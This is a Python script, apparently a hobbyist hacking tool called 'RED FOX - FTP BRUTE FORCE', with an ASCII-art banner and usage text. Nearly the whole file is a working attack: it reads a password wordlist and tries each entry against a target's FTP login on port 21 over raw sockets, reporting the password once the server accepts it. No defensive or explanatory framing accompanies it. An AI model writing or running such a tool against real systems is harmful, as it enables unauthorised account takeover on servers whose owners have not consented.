import socket
import sys
import re

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
BOLD = '\033[1m'
CYAN = '\033[96m'
RESET = '\033[0m'
PURPLE = '\033[95m'

banner = f"""{RED}
                       .-.            .:.              
                              ..             ..        
                             :--.            ..        
                    .:                                 
      ...                             .::              
      .:.                                              
           :                                           
         :#@%=    .=+                                  
         .*@@%#******=                                 
      -%%*+#**+*##*= +                                 
      :@@#*+++++++-  =        ..                       
       .**++++++++. %                  .               
         :**++++==:+                                   
           +*+====*.                                   
           +*++==-:=                                   
          -*++=---:.*                                  
         :*+===---: %                                  
        -#+==-=----.%                                  
       :#+===-------:        ::                        
     :*+======---=+         .                         
     #+===----====*                                   
     %===---===+*#%=.                                 
     #=====*#+-:     .-:                              
     =+==++=---:      .:                              
      +*==-----=:   :--                               
       :+*****##*=--                                 

	 {BOLD}RED FOX - FTP BRUTE FORCE
           {BOLD}Created by: @foxzinnx{RESET} {RESET}"""
print(banner)

if len(sys.argv) != 4:
    print(f"{BOLD}How to use: python redfoxbruteftp.py 127.0.0.1 user wordlist.txt{RESET}")
    sys.exit(1)

target = sys.argv[1]
user = sys.argv[2]
wordlist_path = sys.argv[3]

try:
    with open(wordlist_path, 'r') as wordlist:
        passwords = wordlist.readlines()
except FileNotFoundError:
    print(f"File {wordlist_path} not found.")
    sys.exit(1)

for password in passwords:
    password = password.strip()
    print(f"{CYAN}{BOLD}[+] Starting Brute Force in FTP:{RESET} {BOLD}{PURPLE}{user}{RESET}:{BOLD}{YELLOW}{password}{RESET}")
    
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.connect((target, 21))
    tcp.recv(1024)

    tcp.sendall(f"USER {user}\r\n".encode('utf-8'))
    tcp.recv(1024)
    tcp.sendall(f"PASS {password}\r\n".encode('utf-8'))
    response = tcp.recv(1024).decode('utf-8')
    tcp.sendall("QUIT\r\n".encode('utf-8'))
    tcp.close()

    if re.search('230', response):
        print(f"{BOLD}{GREEN}[+] PASSWORD FOUND:{RESET}  {BOLD}{GREEN}Username: {user}{RESET} | {BOLD}{YELLOW}Password: {password}{RESET}")
        break
